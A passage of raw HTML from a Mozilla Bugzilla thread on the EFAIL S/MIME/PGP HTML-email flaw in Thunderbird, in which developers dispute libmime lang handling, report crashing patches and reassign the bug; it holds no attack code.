            <a href="/show_bug.cgi?id=1419417#c184">Comment 184</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 07:08 PDT" data-time="1526911735">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-184">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-184" data-comment-id="13294087"><span class="quote">&gt; lang=&quot;x-unicode&quot; ... is completely wrong ... should have a language tag, like &quot;en-US&quot;... So this area also needs a
&gt; clean-up sadly.</span >

Please be careful. If you look at Firefox Preferences Font dialog, you see that it mixes languagues with &quot;Unicode&quot;. If you look in browser/components/preferences/fonts.xul, it actually uses &quot;x-unicode&quot; for what's now called &quot;Other languages&quot; in the UI, and &quot;x-western&quot; also exists and is called &quot;Latin&quot; in the Firefox Font UI. So that code is actually perfectly correct for Gecko. And that's the point here, to pick the right font family for display. So, please don't be presumptuous in judging and esp. modifying that code. Like a grandfather, libmime is old code, and it's not perfect, but it does work. Be careful before dismissing it, you might really break stuff.</pre></div><div class="change-set" id="c185"><div class="comment" data-id="13294110" data-no="185"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-185" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15625851_101158"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-185"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-185" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c185">Comment 185</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 07:14 PDT" data-time="1526912046">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-185">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979245"
         class="attachment"
         data-id="8979245" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="tb-efail-div-wrapping.png">
      <meta itemprop="contentSize" content="12043">
      <meta itemprop="encodingFormat" content="image/png">
      <div class="label">
        Attached image
          <a class="link lightbox" href="attachment.cgi?id=8979245" itemprop="contentUrl">
        <span id="att-8979245-description" itemprop="description">&lt;div&gt; is correctly wrapping the HTMl email, with patch v5.*</span></a>
        — <a href="attachment.cgi?id=8979245&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-185" data-comment-id="13294110"><span class="quote">&gt; I tried the sanitised HTML view which</span >

...could explain why you still see the &lt;div&gt; in the wrong place, because you applied the patch here and not the Sanitizer one which you asked me to separate out to <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a>, and if you enabled Sanitized HTML, that means that you wouldn't even use the HTML Parsed class, and would not see the effects of the fix here.

Also, again, please try with real HTML emails, not just the attack emails here.</pre></div><div class="change-set" id="c186"><div class="comment" data-id="13294158" data-no="186"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-186" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-186"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-186" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c186">Comment 186</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 07:31 PDT" data-time="1526913066">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-186">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-186" data-comment-id="13294158">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c184">comment #184</a>)
Sorry Ben, you're confused here. I'm quite aware of encodings and writing systems and how Gecko tries to derive one from the other. Further reading in <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - UX problem selecting font for UTF-8 encoded plain text mail (see comment #8)"
   href="/show_bug.cgi?id=1228193#c10">bug 1228193 comment #10</a>.

Unicode (UTF-8) and Western (windows-1252) in the |View &gt; Text Encoding| menu are encodings. &quot;x-unicode&quot; (Other Languages) and &quot;x-western&quot; (Latin) are writing systems. Language is something different, but language maps to writing system.
<a rel="nofollow" href="https://dxr.mozilla.org/mozilla-central/source/intl/locale/langGroups.properties">https://dxr.mozilla.org/mozilla-central/source/intl/locale/langGroups.properties</a>

Stuffing a writing system into the lang attribute seems 100% wrong, but let's discuss this in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Investigate whether writing a meta tag in mimethsa.cpp is needed and whether writing lang=x-unicode in mimethtm.cpp makes any sense"
   href="/show_bug.cgi?id=1463133">bug 1463133</a>.</pre></div><div class="change-set" id="c187"><div class="comment" data-id="13294164" data-no="187"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-187" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-187"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-187" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c187">Comment 187</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 07:34 PDT" data-time="1526913281">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-187">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-187" data-comment-id="13294164">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c185">comment #185</a>)
<span class="quote">&gt; Also, again, please try with real HTML emails, not just the attack emails
&gt; here.</span >
Ben, with the latest patch, viewing HTML messages just crashes, also seen in the test crashes.

The message from <span class="bz_obsolete"><a href="/attachment.cgi?id=8979247" name="attach_8979247" title="multi-html.eml">attachment 8979247</a> <a href="/attachment.cgi?id=8979247&amp;action=edit" title="multi-html.eml">[details]</a></span> only shows horizontal lines. So sorry, your patch doesn't work at all.</pre></div><div class="change-set" id="c188"><div class="comment" data-id="13294192" data-no="188"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-188" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-188"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-188" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c188">Comment 188</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 07:45 PDT" data-time="1526913939">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-188">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979258"
         class="attachment"
         data-id="8979258" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="test with image for attaching bug.eml">
      <meta itemprop="contentSize" content="1884">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=8979258" itemprop="contentUrl">
        <span id="att-8979258-description" itemprop="description">test with image for attaching bug.eml</span></a>
        — <a href="attachment.cgi?id=8979258&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-188" data-comment-id="13294192">Ben, viewing this message crashes. Please try a few &quot;normal&quot; HTML messages. This one is multi-part related. It crashes in original HTML and sanitised. I have the C++ patch here and the one from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">bug 1462895</a> applied.

As mentioned, the Xpcshell tests also crash. Frankly, I'm tired, I've tried stuff all day. libmime isn't as brilliant as you said, you poke it, and it breaks :-(</pre></div><div class="change-set" id="c189"><div class="comment" data-id="13294196" data-no="189"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-189" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15625851_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-189"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-189" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c189">Comment 189</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 07:47 PDT" data-time="1526914028">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-189">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-189" data-comment-id="13294196">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8979190" name="attach_8979190" title="Separate MIME parts from each other, v5.1 (for trunk)">attachment 8979190</a> <a href="/attachment.cgi?id=8979190&amp;action=edit" title="Separate MIME parts from each other, v5.1 (for trunk)">[details]</a> <a href="/attachment.cgi?id=8979190&amp;action=diff" title="Separate MIME parts from each other, v5.1 (for trunk)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8979190'>[review]</a>
Separate MIME parts from each other, v5.1 (for trunk)

This causes crashes and obliterates previously working display of HTML messages.

Please re-submit when working. Ideally, as the assignee, do a try push and also run the tests manually.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979190&amp;action=edit"
           title="Separate MIME parts from each other, v5.1 (for trunk)"
           class=""
        >Attachment #8979190</a> -
        Flags: review-</div></div></div><div class="change-set" id="c190"><div class="comment" data-id="13294280" data-no="190"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-190" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15625851_101158"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15625851_101158"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-190"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-190" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c190">Comment 190</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 08:18 PDT" data-time="1526915898">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-190">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-190" data-comment-id="13294280"><span class="quote">&gt; Please re-submit when working.</span >

I'm done here. I've been working on this since almost a week, more than full time, and most of that on the review and building various branches. I'm seriously neglecting my job.

<span class="quote">&gt; Ben, with the latest patch, viewing HTML messages just crashes, also seen in the test crashes.</span >

Like I said, trunk without any changes crashes for me on startup, so I can't do anything for trunk.

52.8.1 is what we need to get out right now. The 52 patch works for me for TB 52. Including the test message you attached, and all messages from my inbox that I tried, and the attack emails. 52 hasn't ever crashed for me. Did you test on 52? Does it work?

But if this v5.1 patch really doesn't work, then we can land v4. It misses the margin for the separator, but that's not that serious. We can fix it later properly. We need to get the security fix out.

Jörg or Magnus, it's up to you now. We can land either v5.1 or v4.</pre></div><div class="change-set" id="a15641041_22599"><div class="change" id="aa15641041_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15641041_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15641041_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15641041_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15641041_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15641041_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 08:18 PDT" data-time="1526915932">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979192&amp;action=edit"
           title="Separate MIME parts from each other, v5.1 (for 52)"
           class=""
        >Attachment #8979192</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="a15641058_22599"><div class="change" id="aa15641058_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15641058_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15641058_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15641058_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15641058_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15641058_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 08:19 PDT" data-time="1526915949">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976363&amp;action=edit"
           title="Sanitize quotes, v4 (for 52)"
           class=""
        >Attachment #8976363</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="a15641131_22599"><div class="change" id="aa15641131_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15641131_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15641131_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15641131_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15641131_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15641131_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 08:20 PDT" data-time="1526916022">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976363&amp;action=edit"
           title="Sanitize quotes, v4 (for 52)"
           class=""
        >Attachment #8976363</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div></div></div><div class="change-set" id="a15641156_22599"><div class="change" id="aa15641156_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15641156_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15641156_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15641156_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15641156_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15641156_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 08:20 PDT" data-time="1526916047">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
        Attachment description: Separate MIME parts from each other, v4 (trunk and 52) - not for landing, but contains code for TB 52 and 60. &rarr; Separate MIME parts from each other, v4 (trunk and 52)</div><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c191"><div class="comment" data-id="13294436" data-no="191"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-191" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15641156_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15641156_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-191"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-191" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c191">Comment 191</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 09:26 PDT" data-time="1526919987">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-191">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-191" data-comment-id="13294436">Ben, no one builds TB 52.x at home. Everyone builds on trunk. I don't understand why you're asking for review again when attachment v4 again, when a later version already had r+ and I addressed the review comments &quot;Content-Type&quot; later.</pre></div><div class="change-set" id="c192"><div class="comment" data-id="13294468" data-no="192"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-192" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15641156_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15641156_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-192"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-192" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c192">Comment 192</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 09:37 PDT" data-time="1526920677">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-192">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-192" data-comment-id="13294468">Ben indicated that he is done here, so I'll collect the pieces and get them landed.</pre><div class="activity"><div class="change">Assignee: ben.bucksch &rarr; jorgk</div></div></div><div class="change-set" id="a15645817_176914"><div class="change" id="aa15645817_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15645817_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15645817_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15645817_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15645817_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15645817_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 09:38 PDT" data-time="1526920708">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979190&amp;action=edit"
           title="Separate MIME parts from each other, v5.1 (for trunk)"
           class=""
        >Attachment #8979190</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="a15645832_176914"><div class="change" id="aa15645832_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15645832_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15645832_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15645832_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15645832_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15645832_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 09:38 PDT" data-time="1526920723">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979192&amp;action=edit"
           title="Separate MIME parts from each other, v5.1 (for 52)"
           class=""
        >Attachment #8979192</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8979192&amp;action=edit"
           title="Separate MIME parts from each other, v5.1 (for 52)"
           class=""
        >Attachment #8979192</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div></div></div><div class="change-set" id="a15645859_176914"><div class="change" id="aa15645859_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15645859_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15645859_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15645859_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15645859_176914">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15645859_176914">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 09:39 PDT" data-time="1526920750">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8976349&amp;action=edit"
           title="Separate MIME parts from each other, v4 (trunk and 52)"
           class=""
        >Attachment #8976349</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div></div></div><div class="change-set" id="a15645892_176914"><div class="change" id="aa15645892_176914">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15645892_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_176914" id="a15645892_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15645892_176914"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15645892_176914">
        <td>
          <h3 class="change-name">
